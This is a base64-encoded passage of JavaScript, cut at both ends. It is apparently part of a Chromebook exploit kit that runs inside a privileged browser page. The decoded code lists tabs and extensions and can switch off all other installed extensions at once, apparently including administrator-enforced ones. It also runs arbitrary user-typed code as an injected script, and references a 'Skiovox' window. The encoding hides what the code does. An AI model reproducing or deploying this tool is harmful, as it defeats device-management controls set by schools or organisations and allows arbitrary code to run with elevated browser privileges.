CAgICAgICAgICAgY2hyb21lLnRhYnMuZ2V0Q3VycmVudChmdW5jdGlvbih0YWIpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgY2hyb21lLndpbmRvd3MudXBkYXRlKAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdGFiLndpbmRvd0lkLCB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZm9jdXNlZDogdHJ1ZSwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0sCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBmdW5jdGlvbigpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjaHJvbWUudGFicy51cGRhdGUodGFiLmlkLCB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGFjdGl2ZTogdHJ1ZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0pOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRoaXouZGlzYXJtID0gZmFsc2U7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdGhpei5wcmV2aWV3aW5nID0gZmFsc2U7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9LCAxMDApOwogICAgICAgICAgICAgICAgICAgICAgICB9OwoKICAgICAgICAgICAgICAgICAgICAgICAgZGl2LmFwcGVuZENoaWxkKHByZXZpZXdCdXR0b24pOwogICAgICAgICAgICAgICAgICAgICAgICB0YWJsaXN0LmFwcGVuZENoaWxkKGRpdik7CiAgICAgICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgICAgICAgICAgdGhpei50YWJMaXN0SW5Qcm9ncmVzcyA9IGZhbHNlOwogICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgIH0pOwogICAgICAgIH0pOwogICAgfQogICAgYWN0aXZhdGUoKSB7CiAgICAgICAgZG9jdW1lbnQuYm9keS5pbnNlcnRBZGphY2VudEhUTUwoCiAgICAgICAgICAgICJiZWZvcmVlbmQiLAogICAgICAgICAgICBEZWZhdWx0RXh0ZW5zaW9uQ2FwYWJpbGl0aWVzLnRlbXBsYXRlCiAgICAgICAgKTsKCiAgICAgICAgZG9jdW1lbnQuYm9keQogICAgICAgICAgICAucXVlcnlTZWxlY3RvcigiI2V4dF9kZWZhdWx0IikKICAgICAgICAgICAgLnF1ZXJ5U2VsZWN0b3JBbGwoImJ1dHRvbiIpCiAgICAgICAgICAgIC5mb3JFYWNoKGZ1bmN0aW9uKGJ0bikgewoKICAgICAgICAgICAgICAgIGJ0bi5hZGRFdmVudExpc3RlbmVyKCJjbGljayIsIHRoaXMub25CdG5DbGlja18uYmluZCh0aGlzLCBidG4pKTsKICAgICAgICAgICAgfSwgdGhpcyk7CgogICAgICAgIHRoaXMudXBkYXRlVGFiTGlzdCgpOwogICAgICAgIGZvciAobGV0IGkgaW4gY2hyb21lLnRhYnMpIHsKICAgICAgICAgICAgaWYgKGkuc3RhcnRzV2l0aCgib24iKSkgewogICAgICAgICAgICAgICAgY2hyb21lLnRhYnNbaV0uYWRkTGlzdGVuZXIoKCkgPT4gewogICAgICAgICAgICAgICAgICAgIHRoaXMudXBkYXRlVGFiTGlzdCgpOwogICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgIH0KICAgICAgICB9CgogICAgfQogICAgc3RhdGljIGdldEZTKCkgewogICAgICAgIHJldHVybiBuZXcgUHJvbWlzZShmdW5jdGlvbihyZXNvbHZlKSB7CiAgICAgICAgICAgIHdlYmtpdFJlcXVlc3RGaWxlU3lzdGVtKFRFTVBPUkFSWSwgMiAqIDEwMjQgKiAxMDI0LCByZXNvbHZlKTsKICAgICAgICB9KTsKICAgIH0KICAgIHN0YXRpYyBhc3luYyB3cml0ZUZpbGUoZmlsZSwgZGF0YSkgewogICAgICAgIGNvbnN0IGZzID0gYXdhaXQgRGVmYXVsdEV4dGVuc2lvbkNhcGFiaWxpdGllcy5nZXRGUygpOwogICAgICAgIHJldHVybiBuZXcgUHJvbWlzZSgocmVzb2x2ZSwgcmVqZWN0KSA9PiB7CiAgICAgICAgICAgIGZzLnJvb3QuZ2V0RmlsZShmaWxlLCB7CiAgICAgICAgICAgICAgICBjcmVhdGU6IHRydWUKICAgICAgICAgICAgfSwgZnVuY3Rpb24oZW50cnkpIHsKICAgICAgICAgICAgICAgIGVudHJ5LnJlbW92ZShmdW5jdGlvbigpIHsKICAgICAgICAgICAgICAgICAgICBmcy5yb290LmdldEZpbGUoZmlsZSwgewogICAgICAgICAgICAgICAgICAgICAgICBjcmVhdGU6IHRydWUKICAgICAgICAgICAgICAgICAgICB9LCBmdW5jdGlvbihlbnRyeSkgewogICAgICAgICAgICAgICAgICAgICAgICBlbnRyeS5jcmVhdGVXcml0ZXIoZnVuY3Rpb24od3JpdGVyKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICB3cml0ZXIud3JpdGUobmV3IEJsb2IoW2RhdGFdKSk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICB3cml0ZXIub253cml0ZWVuZCA9IHJlc29sdmUuYmluZChudWxsLCBlbnRyeS50b1VSTCgpKTsKICAgICAgICAgICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgfSk7CiAgICAgICAgfSk7CiAgICB9CiAgICBzdGF0aWMgYXN5bmMgZXZhbENvZGUoY29kZSkgewogICAgICAgIGNvbnN0IHVybCA9IGF3YWl0IERlZmF1bHRFeHRlbnNpb25DYXBhYmlsaXRpZXMud3JpdGVGaWxlKCJzcmMuanMiLCBjb2RlKTsKICAgICAgICBsZXQgc2NyaXB0ID0KICAgICAgICAgICAgZG9jdW1lbnQuYm9keS5xdWVyeVNlbGVjdG9yKCIjZXZhbHVhdGVfZWxlbSIpID8/CiAgICAgICAgICAgIGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoInNjcmlwdCIpOwogICAgICAgIHNjcmlwdC5yZW1vdmUoKTsKICAgICAgICBzY3JpcHQgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJzY3JpcHQiKTsKICAgICAgICBzY3JpcHQuaWQgPSAiZXZhbHVhdGVfZWxlbSI7CiAgICAgICAgc2NyaXB0LnNyYyA9IHVybDsKICAgICAgICBkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKHNjcmlwdCk7CiAgICB9CgogICAgYXN5bmMgb25CdG5DbGlja18oYikgewogICAgICAgIHN3aXRjaCAoYi5pZCkgewogICAgICAgICAgICBjYXNlICJjb2RlX2V2YWx1YXRlIjogewogICAgICAgICAgICAgICAgY29uc29sZS5sb2coIkV2YWx1YXRpbmcgY29kZSEiKTsKICAgICAgICAgICAgICAgIGNvbnN0IHggPSBkb2N1bWVudC5xdWVyeVNlbGVjdG9yKCIjY29kZV9pbnB1dCIpLnZhbHVlOwogICAgICAgICAgICAgICAgY29uc3QgZnMgPSBhd2FpdCBEZWZhdWx0RXh0ZW5zaW9uQ2FwYWJpbGl0aWVzLmdldEZTKCk7CiAgICAgICAgICAgICAgICBEZWZhdWx0RXh0ZW5zaW9uQ2FwYWJpbGl0aWVzLmV2YWxDb2RlKHgpOwogICAgICAgICAgICB9CiAgICAgICAgICAgIGNhc2UgInRhYnJlbG9hZCI6IHsKICAgICAgICAgICAgICAgIHRoaXMudXBkYXRlVGFiTGlzdCgpOwogICAgICAgICAgICB9CiAgICAgICAgfQogICAgfQp9CmNsYXNzIEhvc3RQZXJtaXNzaW9ucyB7CiAgICBhY3RpdmF0ZSgpIHt9Cn0KCmZ1bmN0aW9uIGNyZWF0ZUV4dGVuc2lvbkNhcmQobmFtZSwgaWQsIGVuYWJsZWQsIGljb25fdXJsKSB7CiAgY29uc3QgbGkgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJsaSIpOwogIGxpLmNsYXNzTmFtZSA9ICJleHRlbnNpb24tY2FyZCI7CgogIGNvbnN0IGhlYWRlckRpdiA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoImRpdiIpOwogIGhlYWRlckRpdi5jbGFzc05hbWUgPSAiZXh0ZW5zaW9uLWhlYWRlciI7CgogIGNvbnN0IGljb24gPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJpbWciKTsKICBpY29uLmNsYXNzTmFtZSA9ICJleHRlbnNpb24taWNvbiI7CiAgaWNvbi5zcmMgPSBpY29uX3VybDsKICBpY29uLmFsdCA9ICJFeHRlbnNpb24gSWNvbiI7CgogIGNvbnN0IG5hbWVEaXYgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJkaXYiKTsKICBuYW1lRGl2LmNsYXNzTmFtZSA9ICJleHRlbnNpb24tbmFtZSI7CiAgbmFtZURpdi50ZXh0Q29udGVudCA9IG5hbWU7CgogIGhlYWRlckRpdi5hcHBlbmRDaGlsZChpY29uKTsKICBoZWFkZXJEaXYuYXBwZW5kQ2hpbGQobmFtZURpdik7CgogIGNvbnN0IGlkRGl2ID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgiZGl2Iik7CiAgaWREaXYuY2xhc3NOYW1lID0gImV4dGVuc2lvbi1pZCI7CiAgaWREaXYudGV4dENvbnRlbnQgPSBpZDsKCiAgY29uc3Qgc3dpdGNoTGFiZWwgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJsYWJlbCIpOwogIHN3aXRjaExhYmVsLmNsYXNzTmFtZSA9ICJzd2l0Y2giOwoKICBjb25zdCBjaGVja2JveCA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoImlucHV0Iik7CiAgY2hlY2tib3gudHlwZSA9ICJjaGVja2JveCI7CiAgaWYgKGVuYWJsZWQpIGNoZWNrYm94LmNoZWNrZWQgPSB0cnVlOwoKICBjb25zdCBzbGlkZXJTcGFuID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic3BhbiIpOwogIHNsaWRlclNwYW4uY2xhc3NOYW1lID0gInNsaWRlciI7CgogIHN3aXRjaExhYmVsLmFwcGVuZENoaWxkKGNoZWNrYm94KTsKICBzd2l0Y2hMYWJlbC5hcHBlbmRDaGlsZChzbGlkZXJTcGFuKTsKCiAgbGkuYXBwZW5kQ2hpbGQoaGVhZGVyRGl2KTsKICBsaS5hcHBlbmRDaGlsZChpZERpdik7CiAgbGkuYXBwZW5kQ2hpbGQoc3dpdGNoTGFiZWwpOwoKICByZXR1cm4gbGk7Cn0KCmZ1bmN0aW9uIGNyZWF0ZUV4dGVuc2lvbkNhcmRBbGwoZW5hYmxlZCA9IHRydWUpIHsKICBjb25zdCBsaSA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoImxpIik7CiAgbGkuY2xhc3NOYW1lID0gImV4dGVuc2lvbi1jYXJkLWFsbCI7CiAgbGkuaW5uZXJIVE1MID0gYAogICAgPGRpdiBjbGFzcz0iZXh0ZW5zaW9uLWhlYWRlciI+CiAgICAgIDxpbWcgY2xhc3M9ImV4dGVuc2lvbi1pY29uIiBzcmM9Imh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9UM00xTjRML1QzTTFONEwvcmVmcy9oZWFkcy9tYWluL2ltYWdlcy9YT3NYLmdpZiIgLz4KICAgICAgPGRpdiBjbGFzcz0iZXh0ZW5zaW9uLW5hbWUiPkFsbCBFeHRlbnNpb25zPC9kaXY+CiAgICA8L2Rpdj4KICAgIDxsYWJlbCBjbGFzcz0ic3dpdGNoIj4KICAgICAgPGlucHV0IHR5cGU9ImNoZWNrYm94IiAke2VuYWJsZWQgPyAiY2hlY2tlZCIgOiAiIn0+CiAgICAgIDxzcGFuIGNsYXNzPSJzbGlkZXIiPjwvc3Bhbj4KICAgIDwvbGFiZWw+CiAgYDsKICByZXR1cm4gbGk7Cn0KCmZ1bmN0aW9uIHVwZGF0ZUV4dGVuc2lvblN0YXR1cyhleHRsaXN0X2VsZW1lbnQpIHsKICAgIHJldHVybiBuZXcgUHJvbWlzZShmdW5jdGlvbihyZXNvbHZlLCByZWplY3QpIHsKICAgICAgICBleHRsaXN0X2VsZW1lbnQuaW5uZXJIVE1MID0gIiI7CiAgICAgICAgbGV0IGNhcmRBbGwgPSBjcmVhdGVFeHRlbnNpb25DYXJkQWxsKCk7CiAgICAgICAgbGV0IGNhcmRJbnB1dEFsbCA9IGNhcmRBbGwucXVlcnlTZWxlY3RvcigiaW5wdXQiKTsKCiAgICAgICAgY2FyZElucHV0QWxsLmFkZEV2ZW50TGlzdGVuZXIoImNoYW5nZSIsIChldmVudCkgPT4gewogICAgICAgICAgICBjYXJkSW5wdXRBbGwuZGlzYWJsZWQgPSB0cnVlOwogICAgICAgICAgICBjaHJvbWUubWFuYWdlbWVudC5nZXRTZWxmKGZ1bmN0aW9uKHNlbGYpIHsKICAgICAgICAgICAgICAgIGNocm9tZS5tYW5hZ2VtZW50LmdldEFsbChmdW5jdGlvbihleHRlbnNpb25zKSB7CiAgICAgICAgICAgICAgICAgICAgaWYgKGNocm9tZS5ydW50aW1lLmxhc3RFcnJvcikgewogICAgICAgICAgICAgICAgICAgICAgICBhbGVydCgKICAgICAgICAgICAgICAgICAgICAgICAgICAgICJFcnJvciBsb2FkaW5nIGV4dGVuc2lvbnM6ICIgKyBjaHJvbWUucnVudGltZS5sYXN0RXJyb3IubWVzc2FnZQogICAgICAgICAgICAgICAgICAgICAgICApOwogICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4gcmVqZWN0KGNocm9tZS5ydW50aW1lLmxhc3RFcnJvcik7CiAgICAgICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgICAgICBjb25zdCBwcm9taXNlcyA9IFtdOwogICAgICAgICAgICAgICAgICAgIGZvciAobGV0IGkgPSAwOyBpIDwgZXh0ZW5zaW9ucy5sZW5ndGg7IGkrKykgewogICAgICAgICAgICAgICAgICAgICAgICBsZXQgZXh0SWQgPSBleHRlbnNpb25zW2ldLmlkOwogICAgICAgICAgICAgICAgICAgICAgICBpZiAoZXh0SWQgIT09IHNlbGYuaWQpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHByb21pc2VzLnB1c2goCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgY2hyb21lLm1hbmFnZW1lbnQuc2V0RW5hYmxlZChleHRJZCwgZXZlbnQudGFyZ2V0LmNoZWNrZWQpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICApOwogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIFByb21pc2UuYWxsKHByb21pc2VzKQogICAgICAgICAgICAgICAgICAgICAgICAudGhlbigoKSA9PiB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBjYXJkSW5wdXRBbGwuZGlzYWJsZWQgPSBmYWxzZTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJlc29sdmUoKTsKICAgICAgICAgICAgICAgICAgICAgICAgfSkKICAgICAgICAgICAgICAgICAgICAgICAgLmNhdGNoKChlcnJvcikgPT4gewogICAgICAgICAgICAgICAgICAgICAgICAgICAgYWxlcnQoIkVycm9yIGVuYWJsaW5nL2Rpc2FibGluZyBleHRlbnNpb25zOiAiICsgZXJyb3IubWVzc2FnZSk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICByZWplY3QoZXJyb3IpOwogICAgICAgICAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgICAgIH0pOwogICAgICAgICAgICB9KTsKICAgICAgICB9KTsKCiAgICAgICAgZXh0bGlzdF9lbGVtZW50LmFwcGVuZENoaWxkKGNhcmRBbGwpOwoKICAgICAgICBjaHJvbWUubWFuYWdlbWVudC5nZXRBbGwoZnVuY3Rpb24oZXh0bGlzdCkgewogICAgICAgICAgICBpZiAoY2hyb21lLnJ1bnRpbWUubGFzdEVycm9yKSB7CiAgICAgICAgICAgICAgICBhbGVydCgiRXJyb3IgbG9hZGluZyBleHRlbnNpb25zOiAiICsgY2hyb21lLnJ1bnRpbWUubGFzdEVycm9yLm1lc3NhZ2UpOwogICAgICAgICAgICAgICAgcmV0dXJuIHJlamVjdChjaHJvbWUucnVudGltZS5sYXN0RXJyb3IpOwogICAgICAgICAgICB9CgogICAgICAgICAgICBjb25zdCBvcmRsaXN0ID0gW107CiAgICAgICAgICAgIGV4dGxpc3QuZm9yRWFjaChmdW5jdGlvbihleHRlbnNpb24pIHsKICAgICAgICAgICAgICAgIGlmIChleHRlbnNpb24uaWQgPT09IG5ldyBVUkwobmV3IFVSTChsb2NhdGlvbi5ocmVmKS5vcmlnaW4pLmhvc3QpIHsKICAgICAgICAgICAgICAgICAgICByZXR1cm47CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBvcmRsaXN0LnB1c2goZXh0ZW5zaW9uKTsKCiAgICAgICAgICAgICAgICBjb25zdCBpY29uID0KICAgICAgICAgICAgICAgICAgICBleHRlbnNpb24uaWNvbnM/LmZpbmQoKGljKSA9PiBpYy5zaXplID09PSAxMjgpID8/CiAgICAgICAgICAgICAgICAgICAgZXh0ZW5zaW9uLmljb25zPy5hdCgtMSk7CgogICAgICAgICAgICAgICAgbGV0IGNhcmQgPSBjcmVhdGVFeHRlbnNpb25DYXJkKAogICAgICAgICAgICAgICAgICAgIGV4dGVuc2lvbi5uYW1lLAogICAgICAgICAgICAgICAgICAgIGV4dGVuc2lvbi5pZCwKICAgICAgICAgICAgICAgICAgICBleHRlbnNpb24uZW5hYmxlZCwKICAgICAgICAgICAgICAgICAgICBpY29uPy51cmwgfHwKICAgICAgICAgICAgICAgICAgICAiaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL1QzTTFONEwvVDNNMU40TC9yZWZzL2hlYWRzL21haW4vaW1hZ2VzL1hPc1guZ2lmIgogICAgICAgICAgICAgICAgKTsKCiAgICAgICAgICAgICAgICBsZXQgY2FyZElucHV0ID0gY2FyZC5xdWVyeVNlbGVjdG9yKCJpbnB1dCIpOwoKICAgICAgICAgICAgICAgIGNhcmRJbnB1dC5hZGRFdmVudExpc3RlbmVyKCJjaGFuZ2UiLCAoZXZlbnQpID0+IHsKICAgICAgICAgICAgICAgICAgICBjaHJvbWUubWFuYWdlbWVudC5zZXRFbmFibGVkKAogICAgICAgICAgICAgICAgICAgICAgICBleHRlbnNpb24uaWQsCiAgICAgICAgICAgICAgICAgICAgICAgIGV2ZW50LnRhcmdldC5jaGVja2VkLAogICAgICAgICAgICAgICAgICAgICAgICAocmVzdWx0KSA9PiB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoY2hyb21lLnJ1bnRpbWUubGFzdEVycm9yKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgYWxlcnQoCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICJFcnJvciB1cGRhdGluZyBleHRlbnNpb24gc3RhdHVzOiAiICsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgY2hyb21lLnJ1bnRpbWUubGFzdEVycm9yLm1lc3NhZ2UKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICApOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgKTsKICAgICAgICAgICAgICAgIH0pOwoKICAgICAgICAgICAgICAgIGNhcmQucXVlcnlTZWxlY3RvcigiLmV4dGVuc2lvbi1pY29uIikuYWRkRXZlbnRMaXN0ZW5lcigiY2xpY2siLCAoKSA9PiB7CiAgICAgICAgICAgICAgICAgICAgdXNlcmRlZklkcyA9IEpTT04ucGFyc2UobG9jYWxTdG9yYWdlLmdldEl0ZW0oInVzZXJkZWZJZHMiKSk7CiAgICAgICAgICAgICAgICAgICAgaWYgKHVzZXJkZWZJZHMuaW5jbHVkZXMoZXh0ZW5zaW9uLmlkKSkgewogICAgICAgICAgICAgICAgICAgICAgICB1c2VyZGVmSWRzLnJlbW92ZShleHRlbnNpb24uaWQpOwogICAgICAgICAgICAgICAgICAgICAgICBsb2NhbFN0b3JhZ2Uuc2V0SXRlbSgidXNlcmRlZklkcyIsIEpTT04uc3RyaW5naWZ5KHVzZXJkZWZJZHMpKTsKICAgICAgICAgICAgICAgICAgICAgICAgbWFrZVRvYXN0KCJyZW1vdmVkICIgKyBleHRlbnNpb24uc2hvcnROYW1lICsgIiBmcm9tIHRoZSBsaXN0IiwgMik7CiAgICAgICAgICAgICAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgICAgICAgICAgICAgdXNlcmRlZklkcy5wdXNoKGV4dGVuc2lvbi5pZCk7CiAgICAgICAgICAgICAgICAgICAgICAgIGxvY2FsU3RvcmFnZS5zZXRJdGVtKCJ1c2VyZGVmSWRzIiwgSlNPTi5zdHJpbmdpZnkodXNlcmRlZklkcykpOwogICAgICAgICAgICAgICAgICAgICAgICBtYWtlVG9hc3QoImFkZGVkICIgKyBleHRlbnNpb24uc2hvcnROYW1lICsgIiB0byB0aGUgbGlzdCIsIDIpOwogICAgICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICAgICAgaWYgKGxvY2FsU3RvcmFnZS5nZXRJdGVtKCJ1c2VyZGVmSWRzIikgPT09IEpTT04uc3RyaW5naWZ5KFtdKSkgewogICAgICAgICAgICAgICAgICAgICAgICBkb2N1bWVudAogICAgICAgICAgICAgICAgICAgICAgICAgICAgLnF1ZXJ5U2VsZWN0b3IoIiNkaXNhYmxlLXVzZXJkZWYtZXh0cyIpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAuc2V0QXR0cmlidXRlKCJzdHlsZSIsICJkaXNwbGF5OiBub25lOyIpOwogICAgICAgICAgICAgICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICAgICAgICAgICAgIGRvY3VtZW50CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAucXVlcnlTZWxlY3RvcigiI2Rpc2FibGUtdXNlcmRlZi1leHRzIikKICAgICAgICAgICAgICAgICAgICAgICAgICAgIC5zZXRBdHRyaWJ1dGUoInN0eWxlIiwgImRpc3BsYXk6IGlubGluZTsiKTsKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICB9KTsKCiAgICAgICAgICAgICAgICBleHRsaXN0X2VsZW1lbnQuYXBwZW5kQ2hpbGQoY2FyZCk7CiAgICAgICAgICAgIH0pOwogICAgICAgICAgICBzYXZlZEV4dExpc3QgPSBvcmRsaXN0OwogICAgICAgICAgICByZXNvbHZlKCk7CiAgICAgICAgfSk7CiAgICB9KTsKfQoKY29uc3QgZmlsZU1hbmFnZXJQcml2YXRlVGVtcGxhdGUgPSBgCiAgPGRpdiBpZD0iZmlsZU1hbmFnZXJQcml2YXRlX2NhcCI+CiAgICA8ZGl2IGlkPSJGTVBfb3BlblVSTCI+CiAgICAgIDxidXR0b24gaWQ9ImJ0bl9GTVBfb3BlblVSTCI+T3BlbiBVUkwgaW4gU2tpb3ZveCB3aW5kb3c8L2J1dHRvbj4KICAgIDwvZGl2PgogIDwvZGl2PgoKYDsKY29uc3QgaHRtbFN0eWxlID0gYAo8c3R5bGU+CkBpbXBvcnQgdXJsKCdodHRwczovL2ZvbnRzLmdvb2dsZWFwaXMuY29tL2NzczI/ZmFtaWx5PVJvYm90bzp3Z2h0QDQwMCZkaXNwbGF5PXN3YXAnKTsKCiogewogIGZvbnQtZmFtaWx5OiAnUm9ib3RvJywgQXJpYWwsIHNhbnMtc2VyaWY7Cn0KCmJvZHkgewogIGJhY2tncm91bmQtY29sb3I6ICMxZTFmMjI7CiAgY29sb3I6ICNmZmY7CiAgbWFyZ2luOiAwOwogIHBhZGRpbmc6IDIwcHg7Cn0KCmJvZHk6Oi13ZWJraXQtc2Nyb2xsYmFyLApkaWFsb2c6Oi13ZWJraXQtc2Nyb2xsYmFyLApkaWFsb2cgZGl2Ojotd2Via2l0LXNjcm9sbGJhciB7CiAgZGlzcGxheTogbm9uZTsKfQoKcCB7CiAgbWFyZ2luOiA1cHggYXV0bzsKICBjb2xvcjogd2hpdGU7Cn0KCiNjaHJvbWVfbWFuYWdlbWVudF9kaXNhYmxlX2V4dCwgI2V4dF9kZWZhdWx0IHsKICBtYXgtd2lkdGg6IDEyMDBweDsKICBtYXJnaW46IDAgYXV0bzsKfQoKaDEgewogIGZvbnQtc2l6ZTogMjRweDsKICBtYXJnaW4tYm90dG9tOiAyMHB4Owp9CgouZGVzY3JpcHRpb24gewogIG1hcmdpbi1ib3R0b206IDIwcHg7Cn0KCnVsIHsKICBsaXN0LXN0eWxlLXR5cGU6IG5vbmU7CiAgcGFkZGluZzogMDsKICBtYXJnaW46IDA7CiAgcGFkZGluZy1ib3R0b206IDUwcHg7CiAgZGlzcGxheTogZmxleDsKICBmbGV4LXdyYXA6IHdyYXA7CiAgZ2FwOiAxMHB4OwogIGp1c3RpZnktY29udGVudDogY2VudGVyOwp9CgouZXh0ZW5zaW9uLWNhcmQsIC5leHRlbnNpb24tY2FyZC1hbGwgewogIG1hcmdpbi1sZWZ0OiA1cHg7CiAgbWFyZ2luLWJvdHRvbTogNnB4OwogIGJhY2tncm91bmQ6ICMyOTJhMmQ7CiAgYm9yZGVyLXJhZGl1czogMTBweDsKICB3aWR0aDogMzc1cHg7CiAgaGVpZ2h0OiAxNDBweDsKICBwYWRkaW5nOiAxMHB4OwogIGRpc3BsYXk6IGZsZXg7CiAgZmxleC1kaXJlY3Rpb246IGNvbHVtbjsKICBnYXA6IDEwcHg7CiAgcGFkZGluZzogMTBweDsKICBwb3NpdGlvbjogcmVsYXRpdmU7CiAgYm94LXNoYWRvdzogMCA0cHggOHB4IHJnYmEoMCwgMCwgMCwgMC4yKTsKfQoKLmV4dGVuc2lvbi1oZWFkZXIgewogIGRpc3BsYXk6IGZsZXg7CiAgYWxpZ24taXRlbXM6IGNlbnRlcjsKICBtYXJnaW4tYm90dG9tOiAyNXB4OwogIG1hcmdpbi10b3A6IDEwcHg7Cn0KCi5leHRlbnNpb24taWNvbiB7CiAgd2lkdGg6IDMycHg7CiAgaGVpZ2h0OiAzMnB4OwogIGZsZXgtc2hyaW5rOiAwOwogIHVzZXItc2VsZWN0OiBub25lOwogIG1hcmdpbi1sZWZ0OiAxMHB4OwogIG1hcmdpbi1yaWdodDogMTBweDsKfQoKLmV4dGVuc2lvbi1uYW1lIHsKICBmb250LXNpemU6IDEzcHg7CiAgY29sb3I6IHdoaXRlOwp9CgouZXh0ZW5zaW9uLWlkIHsKICBmb250LXNpemU6IDEzcHg7CiAgY29sb3I6ICNjNGM3YzU7CiAgbWFyZ2luLWxlZnQ6IDEwcHg7Cn0KCi5zd2l0Y2ggewogICAgcG9zaXRpb246IGFic29sdXRlOwogICAgZGlzcGxheTogaW5saW5lLWJsb2NrOwogICAgd2lkdGg6IDI4cHg7CiAgICBoZWlnaHQ6IDE2cHg7CiAgICByaWdodDogMjBweDsKICAgIGJvdHRvbTogMTVweDsKfQoKLnN3aXRjaCBpbnB1dCB7CiAgb3BhY2l0eTogMDsKICB3aWR0aDogMDsKICBoZWlnaHQ6IDA7Cn0KCi5zbGlkZXIgewogIHBvc2l0aW9uOiBhYnNvbHV0ZTsKICBjdXJzb3I6IHBvaW50ZXI7CiAgdG9wOiAwOwogIGxlZnQ6IDA7CiAgcmlnaHQ6IDA7CiAgYm90dG9tOiAwOwogIGJhY2tncm91bmQtY29sb3I6ICM0NDQ3NDY7CiAgYm9yZGVyLXJhZGl1czogMTVweDsKICBib3JkZXI6IDEuNXB4IHNvbGlkICM4ZTkxOGY7CiAgdHJhbnNpdGlvbjogYmFja2dyb3VuZC1jb2xvciAwLjFzIGVhc2UtaW4tb3V0LCBib3JkZXItY29sb3IgMC4xcyBlYXNlLWluLW91dDsKfQoKLnNsaWRlcjpiZWZvcmUgewogIGNvbnRlbnQ6ICIiOwogIHBvc2l0aW9uOiBhYnNvbHV0ZTsKICBoZWlnaHQ6IDEycHg7CiAgd2lkdGg6IDEycHg7CiAgbGVmdDogMnB4OwogIHRvcDogNTAlOwogIHRyYW5zZm9ybTogdHJhbnNsYXRlWSgtNTAlKSBzY2FsZSgwLjgpOwogIGJhY2tncm91bmQtY29sb3I6ICM4ZTkxOGY7CiAgYm9yZGVyLXJhZGl1czogNTAlOwogIHRyYW5zaXRpb246IHRyYW5zZm9ybSAwLjFzIGVhc2UtaW4tb3V0LCBiYWNrZ3JvdW5kLWNvbG9yIDAuMXMgZWFzZS1pbi1vdXQ7Cn0KCi5zd2l0Y2g6aG92ZXIgLnNsaWRlcjpiZWZvcmUgewogIGJveC1zaGFkb3c6IDAgMCA2cHggcmdiYSgyNTUsIDI1NSwgMjU1LCAwLjUpOwp9CgppbnB1dDpjaGVja2VkICsgLnNsaWRlciB7CiAgYmFja2dyb3VuZC1jb2xvcjogI2E4YzdmYTsKICBib3JkZXItY29sb3I6ICNhOGM3ZmE7Cn0KCmlucHV0OmNoZWNrZWQgKyAuc2xpZGVyOmJlZm9yZSB7CiAgdHJhbnNmb3JtOiB0cmFuc2xhdGUoMTBweCwgLTUwJSkgc2NhbGUoMSk7CiAgYmFja2dyb3VuZC1jb2xvcjogIzA2MmU2ZjsKfQoKLmhlYWR